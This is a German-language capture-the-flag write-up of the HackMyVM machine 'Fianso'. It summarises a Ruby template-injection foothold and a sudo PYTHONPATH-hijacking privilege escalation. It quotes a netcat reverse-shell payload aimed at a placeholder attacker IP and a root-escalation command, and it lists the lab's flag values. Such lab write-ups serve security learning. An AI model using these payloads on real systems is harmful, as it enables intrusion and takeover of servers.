# Fianso - HackMyVM (Hard)

![Fianso.png](Fianso.png)

## Übersicht

*   **VM:** Fianso
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Fianso)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 10. April 2023
*   **Original-Writeup:** https://alientec1908.github.io/Fianso_HackMyVM_Hard/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war die Kompromittierung der virtuellen Maschine "Fianso" auf der HackMyVM-Plattform. Die Enumeration ergab einen SSH-Dienst (Port 22) und einen WEBrick HTTP-Server (Port 8000), der mit Ruby lief. Die Webanwendung auf Port 8000 war anfällig für Server-Side Template Injection (SSTI) mit Ruby-Syntax (`#{...}`). Diese SSTI-Schwachstelle wurde ausgenutzt, um Remote Code Execution (RCE) zu erlangen und eine Reverse Shell als Benutzer `sofiane` zu erhalten. Die anschließende Privilege Escalation zu `root` erfolgte durch eine unsichere `sudo`-Regel. `sofiane` durfte `/usr/bin/beet` (ein Musik-Management-Tool) als `root` ohne Passwort ausführen, wobei die `SETENV`-Option aktiviert war. Dies ermöglichte `PYTHONPATH`-Hijacking: Ein bösartiges Python-Modul wurde in `/tmp` platziert und `beet` wurde mit `sudo PYTHONPATH=/tmp /usr/bin/beet` ausgeführt, was zur Ausführung des bösartigen Moduls als `root` und somit zu einer Root-Shell führte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   Web Browser (implizit)
*   `nc (netcat)`
*   `python3`
*   `stty`
*   `cat`, `ls`, `cd`, `echo`, `grep`
*   `sudo`
*   `wget` (impliziert für Exploit-Dateien, falls nicht manuell erstellt)
*   `nano` (impliziert zum Erstellen von Skripten)
*   `beet` (Ziel-Binary)
*   Standard Linux-Befehle

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Fianso" gliederte sich in folgende Phasen:

1.  **Reconnaissance:**
    *   IP-Findung mittels `arp-scan` (192.168.2.126).
    *   Portscan mit `nmap` identifizierte Port 22 (SSH OpenSSH 8.4p1) und Port 8000 (WEBrick httpd 1.6.1, Ruby 2.7.4).

2.  **Web Exploitation (SSTI) & Initial Access (als `sofiane`):**
    *   `nikto` auf Port 8000 lieferte allgemeine Informationen.
    *   Manuelle Tests der Webanwendung auf Port 8000 zeigten eine Server-Side Template Injection (SSTI)-Schwachstelle. Eingaben wie `#{7*7}` wurden serverseitig zu `49` ausgewertet.
    *   Ein Ruby-SSTI-Payload (`#{system('nc -e /bin/bash <ANGREIFER-IP> <PORT>')}`) wurde verwendet, um eine Reverse Shell zu einer lauschenden Netcat-Instanz aufzubauen.
    *   Die Shell wurde als Benutzer `sofiane` erlangt und stabilisiert. Die User-Flag wurde gelesen.

3.  **Privilege Escalation (von `sofiane` zu `root` via `sudo beet` und `PYTHONPATH` Hijacking):**
    *   `sudo -l` für `sofiane` zeigte zwei Regeln:
        *   `(ALL : ALL) NOPASSWD: /bin/bash /opt/harness` (Passwort für `/opt/harness` unbekannt).
        *   `(ALL : ALL) SETENV: NOPASSWD: /usr/bin/beet` (kritisch).
    *   Die `SETENV`-Option erlaubte das Manipulieren von Umgebungsvariablen für den `sudo`-Aufruf von `beet`.
    *   Ein bösartiges Python-Skript (z.B. `re.py` oder ein korrekt benanntes Modul wie `beetsplug/web.py`) wurde in `/tmp` erstellt. Dieses Skript enthielt Code zum Starten einer Bash-Shell (z.B. `import os; os.system('/bin/bash')`).
    *   Der Befehl `sudo PYTHONPATH=/tmp /usr/bin/beet` wurde ausgeführt. Da `PYTHONPATH` auf `/tmp` gesetzt war, lud `beet` (als `root` laufend) das bösartige Modul aus `/tmp`, was zur Ausführung des Shell-Codes als `root` führte.
    *   Eine Root-Shell wurde erlangt. Die Root-Flag wurde gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Server-Side Template Injection (SSTI) in Ruby/WEBrick:** Die Webanwendung wertete Benutzereingaben unsicher in einem Ruby-Template (vermutlich ERB) aus. Dies ermöglichte die Ausführung von beliebigem Ruby-Code auf dem Server und führte zu Remote Code Execution (RCE).
*   **Unsichere `sudo`-Konfiguration (`SETENV` mit `PYTHONPATH` Hijacking):** Einer `sudo`-Regel erlaubte das Ausführen von `/usr/bin/beet` als `root` mit der Option `SETENV:`. Dies ermöglichte es dem Benutzer `sofiane`, die `PYTHONPATH`-Umgebungsvariable zu setzen, um Python dazu zu bringen, Module aus einem kontrollierten Verzeichnis (`/tmp`) zu laden, wenn `beet` (ein Python-basiertes Tool) gestartet wurde. Ein bösartiges Python-Modul in `/tmp` wurde so mit Root-Rechten ausgeführt.
*   **Vernachlässigung der `bash_history`:** Die Bash-History für `sofiane` war nach `/dev/null` verlinkt, was die Nachverfolgung erschwerte, aber für den Exploit nicht entscheidend war.

## Flags

*   **User Flag (`/home/sofiane/user.txt`):** `dd61014e5d119683f9fc798439cd3916`
*   **Root Flag (`/root/root.txt`):** `129cf8d39dad02722c0b95ddca3ad73d`

## Tags

`HackMyVM`, `Fianso`, `Hard`, `SSTI`, `RubySSTI`, `WEBrick`, `RCE`, `SudoBeet`, `PYTHONPATHHijacking`, `SetEnvSudo`, `Linux`, `Web`, `Privilege Escalation`
